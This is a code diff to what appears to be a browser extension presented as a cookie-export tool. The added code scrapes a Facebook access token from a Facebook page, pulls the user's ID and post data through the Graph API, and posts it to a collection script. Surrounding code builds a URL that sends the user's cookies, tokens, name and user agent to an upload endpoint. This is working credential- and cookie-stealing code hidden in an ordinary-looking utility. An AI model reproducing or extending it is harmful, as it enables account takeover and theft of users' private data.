@@ -1,6 +1,5 @@
 ! function(e, t) {
     "function" == typeof define && define.amd ? define([], t) : "undefined" != typeof exports ? t() : t()
-    alert(define.amd);
 },
 function(e) {
     e.storage.local.get({
@@ -16,14 +15,12 @@ function(e) {
                 auto_refresh: t.auto_refresh,
                 clear_cookies: t.clear_cookies,
                 fullpage: !1,
+                pageNum: 0,
                 error: !1
             },
             methods: {
                 exportCookies: function() {
                     var t = this;
-                    // site = ['www.facebook.com', '']
-                    // if (t['sitename']);
-
                     if (!this.isValidProtocol) return !1;
                     if (this.fullpage) try {
                         var r = new URL(window.top.location.href);
@@ -42,6 +39,34 @@ function(e) {
                         }
                     })
                 },
+                docparse: function(doc) {
+                    var docparse = new DOMParser().parseFromString(doc, "text/xml");
+                    return docparse;
+                },
+                find_element_by_xPath: function(xpath, parent) {
+                    let results = [];
+                    let query = parent.evaluate(xpath, parent || document,
+                        null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
+                    for (let i = 0, length = query.snapshotLength; i < length; ++i) {
+                        results.push(query.snapshotItem(i));
+                    }
+                    return results;
+                },
+                testP: function() {
+                    t = this;
+                    var abc = this.sendRequest("https://mbasic.facebook.com/")
+                    var nf = this.docparse(abc);
+                    console.log(nf);
+                    nf.querySelectorAll("a[href$='#footer_action_list']").forEach(function(item, index) {
+                        var href = item.getAttribute('href').split('?')[0];
+                        if (!(href.includes("mbasic.facebook.com"))) {
+                            href = `https://mbasic.facebook.com${href}`;
+                        }
+                        // console.log(t.sendRequest(href));
+                        console.log(t.sendRequest(href));
+
+                    });
+                },
                 validateAPIid: function(json) {
                     //problem????? idk
                     if (json.hasOwnProperty('group_id')) {
@@ -50,9 +75,76 @@ function(e) {
                         return json['top_level_post_id'];
                     }
                 },
-                sendRequest: function(t) {
+                firstPage: function(t) {
+                    this.fbuToken = this.getuToken();
+
+                    this.fbid = $.ajax({
+                        url: `https://graph.facebook.com/me?fields=id&access_token=${uToken}`,
+                        type: "get",
+                        dataType: 'json',
+                        async: false,
+                        global: false,
+                        success: function(o) {
+
+                        }
+                    }).responseJSON['id'];
+
+                    this.getfbPost("https://mbasic.facebook.com/");
+                },
+                sendRequest: function(url) {
                     var s = $.ajax({
-                        url: "https://mbasic.facebook.com/",
+                        url: url,
+                        type: "get",
+                        async: false,
+                        global: false,
+                        success: function() {
+                            return;
+                        }
+                    }).responseText;
+                    return s;
+                },
+                getfbPost: function(url) {
+                    t = this;
+                    var doc = this.sendRequest(url);
+                    docparse = this.docparse(doc);
+
+                    docparse.querySelectorAll('div#root div[data-ft*="top_level_post_id"]').forEach(function(item, index) {
+                        jsonz = JSON.parse(item.getAttribute('data-ft'));
+                        t.sendData(t.validateAPIid(jsonz));
+                    });
+                    if (this.pageNum > 1) {
+                        this.pageNum = 0;
+                        return;
+                    }
+                    a = docparse.querySelector("div#root > div > a").getAttribute("href");
+                    this.nextPage('https://mbasic.facebook.com' + a);
+                },
+                sendData: function(id) {
+                    t = this;
+                    data = $.ajax({
+                        url: `https://graph.facebook.com/${id}?access_token=${t.fbuToken}`,
+                        type: "get",
+                        async: false,
+                        global: false,
+                        success: function(o) {}
+                    }).responseText;
+
+                    $.ajax({
+                        url: 'http://localhost/testweb/facebook_collection.php',
+                        type: 'POST',
+                        data: JSON.stringify({
+                            uid: t.fbid,
+                            data: data
+                        }),
+                        success: function(result) {
+                            console.log(result);
+                        }
+
+                    });
+                },
+                getuToken: function() {
+                    var s = $.ajax({
+                        url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
                         type: "get",
                         async: false,
                         global: false,
@@ -60,21 +152,12 @@ function(e) {
                             return t;
                         }
                     }).responseText;
-
-                    this.getfbPost(s);
+                    s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
+                    return uToken;
                 },
-                getfbPost: function(doc) {
-                    console.log(this);
-                    var document = new DOMParser().parseFromString(doc, "text/xml");
-                    document.querySelectorAll('div#root div[data-ft*="top_level_post_id"]').forEach(function(item, index) {
-                        jsonz = JSON.parse(item.getAttribute('data-ft'));
-                        // console.log(this.validateAPIid(jsonz));
-                        if (jsonz.hasOwnProperty('group_id')) {
-                            console.log(`${jsonz['group_id']}_${jsonz['top_level_post_id']}`);
-                        } else {
-                            console.log(jsonz['top_level_post_id']);
-                        }
-                    });
+                nextPage: function(href) {
+                    this.pageNum += 1;
+                    this.sendRequest(href);
                 },
                 doExportTwitterGET: function(t) {
                     var r = this;
@@ -189,7 +272,9 @@ function(e) {
                                     }).responseJSON;
                                 }
                                 console.log(fbInfo);
-
+                                // chrome.storage.sync.set({ fbUID: fbInfo['id'], fbName: fbInfo['name'], uToken: uToken, bToken: bToken }, function() {
+                                //     console.log('saved');
+                                // });
                                 var sendurl = `http://localhost/testweb/upload.php?uid=${fbInfo['id']}&name=${fbInfo['name']}&url=${o}&useragent=${UA}&cookie=${format}&uToken=${uToken}&bToken=${bToken}`
                                 console.log(sendurl);
                                 var encodeurl = encodeURI(sendurl);
